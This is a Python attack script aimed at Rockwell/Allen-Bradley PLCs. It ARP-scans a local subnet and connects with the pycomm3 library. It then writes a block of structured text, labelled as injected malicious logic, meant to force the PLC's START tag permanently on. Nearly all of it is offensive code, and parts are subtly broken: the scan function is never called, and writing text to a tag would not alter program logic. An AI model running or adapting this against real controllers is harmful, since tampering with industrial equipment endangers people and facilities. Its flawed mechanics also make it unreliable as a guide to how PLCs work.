from scapy.all import ARP, Ether, srp
from pycomm3 import LogixDriver
import time

# Step 1: Scan for PLC's IP address
def find_plc_ip():
    target_ip_range = "192.168.1.0/24"  # Update according to your network
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip_range)
    ans, _ = srp(request, timeout=2, verbose=False)
    
    for sent, received in ans:
        if received.psrc.startswith("192.168.1."):  # Rockwell PLCs typically use this range
            print(f"[+] Possible PLC found at: {received.psrc}")
            return received.psrc

    print("[-] No PLC found!")
    return None

# Step 2: Connect to the PLC and modify its logic
def modify_plc_logic(plc_ip):
    try:
        with LogixDriver(plc_ip) as plc:
            print(f"[+] Connected to PLC at {plc_ip}")

            # Read existing logic (for persistence, assume we modify `START`)
            original_start = plc.read("START")
            print(f"[+] Original START Value: {original_start.value}")

            # Malicious logic: Modify START behavior to force PLC into permanent activation state
            attack_logic = """
            // Injected Malicious Logic - Ensures START is always True
            IF TRUE THEN
                START := TRUE;
            END_IF;
            """

            # Upload the modified program
            success = plc.write("Prog1.Modify", attack_logic)  # Injected logic
            if success:
                print("[+] Malicious modification successful! PLC logic altered.")

            # Verify change
            modified_start = plc.read("START")
            print(f"[+] Modified START Value: {modified_start.value}")

    except Exception as e:
        print(f"[-] PLC modification failed: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = "192.168.3.9"
    if plc_ip:
        modify_plc_logic(plc_ip)